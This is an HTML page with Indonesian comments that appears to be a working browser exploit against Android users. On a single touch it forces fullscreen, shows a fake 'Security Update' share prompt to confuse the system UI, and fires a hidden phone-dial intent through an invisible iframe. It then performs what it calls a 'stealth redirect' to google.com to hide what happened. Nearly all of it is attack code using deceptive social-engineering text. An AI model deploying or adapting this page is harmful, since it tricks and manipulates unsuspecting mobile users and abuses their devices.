<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>S Y S T 3 M</title>
    <style>
        body, html { 
            margin: 0; padding: 0; background: #000; 
            width: 100vw; height: 100vh; overflow: hidden;
        }
        #trigger {
            width: 100%; height: 100%; cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="trigger"></div>

<script>
    const trigger = document.getElementById('trigger');

    trigger.addEventListener('touchstart', async function() {
        // 1. Fullscreen Lockdown
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        }

        // 2. Persiapkan Intent URL
        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";

        // 3. Picu Web Share API (Memaksa System UI Muncul)
        // Ini akan membingungkan urutan render pada Android
        if (navigator.share) {
            navigator.share({
                title: 'Security Update',
                text: 'System requires verification',
                url: 'https://support.mozilla.org'
            }).catch(() => {}); // Abaikan jika user cancel
        }

        // 4. Picu Intent via Iframe tepat saat Share Sheet sedang memuat
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = intentUrl;
        document.body.appendChild(iframe);

        // 5. Cadangan Pemicu Intent
        setTimeout(() => {
            window.location.href = intentUrl;
        }, 150);

        // 6. STEALTH REDIRECT (The "Ghost" Exit)
        // Redirect dilakukan saat System Share Sheet mungkin masih aktif
        setTimeout(() => {
            if (document.exitFullscreen) {
                document.exitFullscreen();
            }
            window.location.replace("https://www.google.com");
        }, 800);
    });
</script>
</body>
</html>
